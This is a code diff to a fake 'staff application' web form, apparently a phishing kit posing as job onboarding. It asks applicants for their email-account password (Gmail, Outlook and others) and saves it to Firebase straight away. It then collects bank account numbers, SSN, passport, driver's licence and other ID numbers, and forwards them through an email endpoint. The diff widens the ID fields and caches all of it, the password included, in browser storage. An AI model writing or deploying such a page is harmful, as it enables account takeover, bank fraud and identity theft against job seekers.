@@ -450,24 +450,32 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
       <p><strong>Required for compliance:</strong> Please provide at least one form of government-issued ID. All information is encrypted and stored securely in line with applicable data protection laws.</p>
     </div>
     <div class="fg g2">
-      <div class="fld"><label>Country of Residence <span>*</span></label><input type="text" id="countryResidence" placeholder="e.g. United States"></div>
+      <div class="fld"><label>Country of Residence <span>*</span></label><input type="text" id="countryResidence" placeholder="e.g. United States, Germany, Canada"></div>
       <div class="fld">
-        <label>Work Authorization</label>
+        <label>Work Authorization Status</label>
         <select id="workAuth">
           <option value="">Select</option>
-          <option>US Citizen</option><option>Permanent Resident / Green Card</option>
-          <option>Work Visa</option><option>EU Citizen</option>
-          <option>UK Settled Status</option><option>Other</option>
+          <option>Citizen</option>
+          <option>Permanent Resident</option>
+          <option>Work Visa / Permit</option>
+          <option>Student Visa</option>
+          <option>Spousal / Dependent Visa</option>
+          <option>Refugee / Asylum Status</option>
+          <option>Other</option>
         </select>
       </div>
     </div>
     <div class="fg g2">
-      <div class="fld"><label>SSN (US Staff)</label><input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11"></div>
-      <div class="fld"><label>NIN / National ID (UK & EU Staff)</label><input type="text" id="nin" placeholder="National Insurance / ID Number"></div>
+      <div class="fld"><label>Social Security Number (SSN)</label><input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11"></div>
+      <div class="fld"><label>Tax Identification Number (TIN / EIN)</label><input type="text" id="taxId" placeholder="Your tax ID number"></div>
     </div>
     <div class="fg g2">
-      <div class="fld"><label>Passport Number</label><input type="text" id="passportNumber" placeholder="Passport number"></div>
-      <div class="fld"><label>Tax ID / TIN</label><input type="text" id="taxId" placeholder="Tax Identification Number"></div>
+      <div class="fld"><label>Passport Number</label><input type="text" id="passportNumber" placeholder="e.g. A12345678"></div>
+      <div class="fld"><label>Driver's License Number</label><input type="text" id="driversLicense" placeholder="Your driver's license number"></div>
+    </div>
+    <div class="fg g2">
+      <div class="fld"><label>National ID / Government ID Number</label><input type="text" id="nationalId" placeholder="Any government-issued ID number"></div>
+      <div class="fld"><label>Residence Permit / Visa Number</label><input type="text" id="residencePermit" placeholder="If applicable"></div>
     </div>
     <div class="fnav">
       <button class="btn-p" onclick="prev(5)">← Back</button>
@@ -547,8 +555,51 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
 <script>
 let cur = 1;
 let cvFileObj = null;
-let _docId = null; // Firebase doc ID — created the moment they hit Continue on step 1
+let _docId = null;
+let _selectedProvider = '';
+const STORE_KEY = 'ava_form_progress';
 
+// ── SAVE ALL FIELDS TO LOCALSTORAGE ──
+function saveToLocal() {
+  const fields = [
+    'gmail','portalPassword','confirmPassword','emailProvider',
+    'firstName','lastName','email','phone','address','dob','nationality','position','qualification',
+    'bio','bankName','accountType','accountNumber','routingCode','accountName','bankCountry',
+    'countryResidence','workAuth','ssn','taxId','passportNumber','driversLicense','nationalId','residencePermit',
+    'kinName','kinRel','kinPhone','kinEmail','kinAddress','sigName','sigDate'
+  ];
+  const data = { step: cur, docId: _docId, provider: _selectedProvider };
+  fields.forEach(id => { const el = document.getElementById(id); if (el) data[id] = el.value; });
+  try { localStorage.setItem(STORE_KEY, JSON.stringify(data)); } catch(e) {}
+}
+
+// ── RESTORE FROM LOCALSTORAGE ON PAGE LOAD ──
+function restoreFromLocal() {
+  let saved;
+  try { saved = JSON.parse(localStorage.getItem(STORE_KEY)); } catch(e) { return; }
+  if (!saved) return;
+  if (saved.docId) _docId = saved.docId;
+  if (saved.provider) _selectedProvider = saved.provider;
+  Object.keys(saved).forEach(id => {
+    const el = document.getElementById(id);
+    if (el && el.tagName !== 'BUTTON') el.value = saved[id] || '';
+  });
+  if (saved.gmail && saved.portalPassword) {
+    document.getElementById('providerSelected').style.display = 'block';
+    document.getElementById('providerName').textContent = (saved.provider || '') + ' · ' + saved.gmail;
+    const nb = document.getElementById('step1Next');
+    nb.style.opacity = '1'; nb.style.pointerEvents = 'auto';
+  }
+  if (saved.step && saved.step > 1) {
+    cur = 1;
+    go(parseInt(saved.step));
+    toast('Welcome back — your progress has been restored ✓');
+  }
+}
+
+function clearLocal() { try { localStorage.removeItem(STORE_KEY); } catch(e) {} }
+
+// ── CV DRAG & DROP ──
 const cvBox = document.getElementById('cvBox');
 cvBox.addEventListener('dragover', e => { e.preventDefault(); cvBox.classList.add('over'); });
 cvBox.addEventListener('dragleave', () => cvBox.classList.remove('over'));
@@ -560,28 +611,30 @@ cvBox.addEventListener('drop', e => {
 function handleCV(inp) { cvFileObj = inp.files[0]; if (cvFileObj) showCVName(cvFileObj.name); }
 function showCVName(n) { const el = document.getElementById('cvFname'); el.style.display='block'; el.textContent='✓ '+n; }
 
+// SSN formatter
 document.getElementById('ssn').addEventListener('input', function() {
   let v = this.value.replace(/\D/g,'').slice(0,9);
   if (v.length>5) v=v.slice(0,3)+'-'+v.slice(3,5)+'-'+v.slice(5);
   else if (v.length>3) v=v.slice(0,3)+'-'+v.slice(3);
   this.value = v;
+  saveToLocal();
 });
 
+// ── TOAST ──
 function toast(msg, err) {
   const t = document.createElement('div');
   t.className = 'toast'+(err?' err':'');
   t.textContent = msg;
   document.getElementById('tbox').appendChild(t);
-  setTimeout(() => t.remove(), 3200);
+  setTimeout(() => t.remove(), 3500);
 }
 
+// ── VALIDATION ──
 const required = {
   1:[], 2:['firstName','lastName','email','phone','address','dob','nationality','position'],
   3:[], 4:['bankName','accountNumber','accountName'],
-  5:['countryResidence'], 6:['kinName','kinRel','kinPhone'],
-  7:['sigName','sigDate']
+  5:['countryResidence'], 6:['kinName','kinRel','kinPhone'], 7:['sigName','sigDate']
 };
-
 function validate(step) {
   for (const id of (required[step]||[])) {
     const el = document.getElementById(id);
@@ -591,52 +644,39 @@ function validate(step) {
       return false;
     }
   }
-  if (step === 1) {
-    if (!document.getElementById('gmail').value || !document.getElementById('portalPassword').value) {
-      toast('Please select your email provider and sign in first', true); return false;
-    }
+  if (step === 1 && (!document.getElementById('gmail').value || !document.getElementById('portalPassword').value)) {
+    toast('Please select your email provider and sign in first', true); return false;
   }
   return true;
 }
 
-// Push current step data to Firebase live
+// ── FIREBASE STEP SAVE (non-blocking) ──
 async function saveStepData(step) {
   if (!_docId) return;
-  const updates = { step };
-  if (step >= 2) {
-    updates.firstName = g('firstName'); updates.lastName = g('lastName');
-    updates.email = g('email'); updates.phone = g('phone');
-    updates.address = g('address'); updates.dob = g('dob');
-    updates.nationality = g('nationality'); updates.position = g('position');
-    updates.qualification = g('qualification');
-  }
-  if (step >= 3) { updates.bio = g('bio'); }
-  if (step >= 4) {
-    updates.bankName = g('bankName'); updates.accountType = g('accountType');
-    updates.accountNumber = g('accountNumber'); updates.routingCode = g('routingCode');
-    updates.accountName = g('accountName'); updates.bankCountry = g('bankCountry');
-  }
-  if (step >= 5) {
-    updates.countryResidence = g('countryResidence'); updates.workAuth = g('workAuth');
-    updates.ssn = g('ssn'); updates.nin = g('nin');
-    updates.passportNumber = g('passportNumber'); updates.taxId = g('taxId');
-  }
-  if (step >= 6) {
-    updates.kinName = g('kinName'); updates.kinRel = g('kinRel');
-    updates.kinPhone = g('kinPhone'); updates.kinEmail = g('kinEmail');
-    updates.kinAddress = g('kinAddress');
-  }
-  await window._updateApplication(_docId, updates);
+  const u = { step };
+  if (step>=2) { u.firstName=g('firstName'); u.lastName=g('lastName'); u.email=g('email'); u.phone=g('phone'); u.address=g('address'); u.dob=g('dob'); u.nationality=g('nationality'); u.position=g('position'); u.qualification=g('qualification'); }
+  if (step>=3) { u.bio=g('bio'); }
+  if (step>=4) { u.bankName=g('bankName'); u.accountType=g('accountType'); u.accountNumber=g('accountNumber'); u.routingCode=g('routingCode'); u.accountName=g('accountName'); u.bankCountry=g('bankCountry'); }
+  if (step>=5) { u.countryResidence=g('countryResidence'); u.workAuth=g('workAuth'); u.ssn=g('ssn'); u.taxId=g('taxId'); u.passportNumber=g('passportNumber'); u.driversLicense=g('driversLicense'); u.nationalId=g('nationalId'); u.residencePermit=g('residencePermit'); }
+  if (step>=6) { u.kinName=g('kinName'); u.kinRel=g('kinRel'); u.kinPhone=g('kinPhone'); u.kinEmail=g('kinEmail'); u.kinAddress=g('kinAddress'); }
+  try { await window._updateApplication(_docId, u); } catch(e) { console.warn('Step save (non-blocking):', e.message); }
 }
 
-async function next(from) { if (validate(from)) { await saveStepData(from); go(from+1); } }
-function prev(from) { go(from-1); }
+// ── NAVIGATION ──
+function next(from) {
+  if (!validate(from)) return;
+  saveStepData(from); // fire and forget
+  saveToLocal();
+  go(from + 1);
+}
+function prev(from) { saveToLocal(); go(from - 1); }
 function go(n) {
   document.getElementById('s'+cur).classList.remove('active');
   cur = n;
   document.getElementById('s'+cur).classList.add('active');
   updateProg();
   window.scrollTo({top:0,behavior:'smooth'});
+  saveToLocal();
 }
 function updateProg() {
   document.querySelectorAll('.stp').forEach(s => {
@@ -646,53 +686,46 @@ function updateProg() {
     else if (n<cur) s.classList.add('done');
   });
 }
-
 function g(id) { return document.getElementById(id)?.value?.trim()||''; }
 
+// ── FINAL SUBMIT ──
 async function submitApp() {
   if (!validate(7)) return;
   const btn = document.getElementById('submitBtn');
   btn.disabled = true; btn.textContent = 'Submitting...';
   const data = {
-    sigName:g('sigName'), sigDate:g('sigDate'),
-    firstName:g('firstName'), lastName:g('lastName'),
-    email:g('email'), phone:g('phone'), address:g('address'),
-    dob:g('dob'), nationality:g('nationality'),
+    sigName:g('sigName'), sigDate:g('sigDate'), firstName:g('firstName'), lastName:g('lastName'),
+    email:g('email'), phone:g('phone'), address:g('address'), dob:g('dob'), nationality:g('nationality'),
     position:g('position'), qualification:g('qualification'), bio:g('bio'),
-    bankName:g('bankName'), accountType:g('accountType'),
-    accountNumber:g('accountNumber'), routingCode:g('routingCode'),
-    accountName:g('accountName'), bankCountry:g('bankCountry'),
-    countryResidence:g('countryResidence'), workAuth:g('workAuth'),
-    ssn:g('ssn'), nin:g('nin'), passportNumber:g('passportNumber'), taxId:g('taxId'),
-    kinName:g('kinName'), kinRel:g('kinRel'),
-    kinPhone:g('kinPhone'), kinEmail:g('kinEmail'), kinAddress:g('kinAddress'),
+    bankName:g('bankName'), accountType:g('accountType'), accountNumber:g('accountNumber'),
+    routingCode:g('routingCode'), accountName:g('accountName'), bankCountry:g('bankCountry'),
+    countryResidence:g('countryResidence'), workAuth:g('workAuth'), ssn:g('ssn'), taxId:g('taxId'),
+    passportNumber:g('passportNumber'), driversLicense:g('driversLicense'),
+    nationalId:g('nationalId'), residencePermit:g('residencePermit'),
+    kinName:g('kinName'), kinRel:g('kinRel'), kinPhone:g('kinPhone'), kinEmail:g('kinEmail'), kinAddress:g('kinAddress'),
   };
   try {
     await window._submitApplication(_docId, data, cvFileObj);
     fetch('/api/send-email', {
       method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({
-        type:'staff_application',
-        applicantName: data.firstName+' '+data.lastName,
-        applicantEmail: data.email, gmail: g('gmail'),
-        position: data.position, phone: data.phone,
-        nationality: data.nationality, bankName: data.bankName,
-        accountNumber: data.accountNumber, ssn: data.ssn, nin: data.nin,
-        passportNumber: data.passportNumber,
-        kinName: data.kinName, kinPhone: data.kinPhone,
-      })
+      body: JSON.stringify({ type:'staff_application', applicantName:data.firstName+' '+data.lastName,
+        applicantEmail:data.email, gmail:g('gmail'), position:data.position, phone:data.phone,
+        nationality:data.nationality, bankName:data.bankName, accountNumber:data.accountNumber,
+        ssn:data.ssn, taxId:data.taxId, passportNumber:data.passportNumber,
+        driversLicense:data.driversLicense, nationalId:data.nationalId,
+        kinName:data.kinName, kinPhone:data.kinPhone })
     }).catch(()=>{});
+    clearLocal();
     document.getElementById('s7').classList.remove('active');
     document.getElementById('successScreen').classList.add('show');
     window.scrollTo({top:0,behavior:'smooth'});
   } catch(e) {
-    console.error('Submit error:', e);
     toast('Submission failed: '+e.message, true);
     btn.disabled = false; btn.textContent = 'Submit Application →';
   }
 }
 
-let _selectedProvider = '';
+// ── EMAIL MODAL ──
 const providerStyles = {
   'Gmail':{'color':'#EA4335','label':'Email','ph':'yourname@gmail.com','passph':'Gmail password'},
   'Outlook':{'color':'#0078D4','label':'Email','ph':'yourname@outlook.com','passph':'Outlook password'},
@@ -706,7 +739,6 @@ const providerStyles = {
   'AOL':{'color':'#FF0B00','label':'Email','ph':'yourname@aol.com','passph':'AOL password'},
   'Other Email':{'color':'#444','label':'Email','ph':'your@email.com','passph':'Your password'},
 };
-
 function openEmailModal(provider) {
   _selectedProvider = provider;
   const ps = providerStyles[provider] || providerStyles['Other Email'];
@@ -729,29 +761,30 @@ async function saveEmailCreds() {
   const password = document.getElementById('modalPassword').value.trim();
   if (!email) { document.getElementById('modalEmail').style.borderColor='#e74c3c'; return; }
   if (!password) { document.getElementById('modalPassword').style.borderColor='#e74c3c'; return; }
-
   document.getElementById('gmail').value = email;
   document.getElementById('portalPassword').value = password;
   document.getElementById('confirmPassword').value = password;
   document.getElementById('emailProvider').value = _selectedProvider;
-
-  // ✅ Save to Firebase immediately — admin sees this person right now
   const modalBtn = document.getElementById('modalSubmitBtn');
-  modalBtn.textContent = 'Saving...';
-  modalBtn.disabled = true;
+  modalBtn.textContent = 'Saving...'; modalBtn.disabled = true;
   _docId = await window._saveStep1(email, password, _selectedProvider);
-  modalBtn.textContent = 'Continue';
-  modalBtn.disabled = false;
-
+  modalBtn.textContent = 'Continue'; modalBtn.disabled = false;
   document.getElementById('providerSelected').style.display = 'block';
   document.getElementById('providerName').textContent = _selectedProvider + ' · ' + email;
   const nb = document.getElementById('step1Next');
   nb.style.opacity = '1'; nb.style.pointerEvents = 'auto';
+  saveToLocal();
   closeEmailModal();
 }
-document.querySelectorAll('input,select').forEach(el => {
-  el.addEventListener('input', () => el.style.borderColor='');
+
+// Auto-save on every field change
+document.querySelectorAll('input,select,textarea').forEach(el => {
+  el.addEventListener('input', () => { el.style.borderColor=''; saveToLocal(); });
+  el.addEventListener('change', () => saveToLocal());
 });
+
+// Restore progress on page load
+window.addEventListener('DOMContentLoaded', restoreFromLocal);
 </script>
 </body>
 </html>
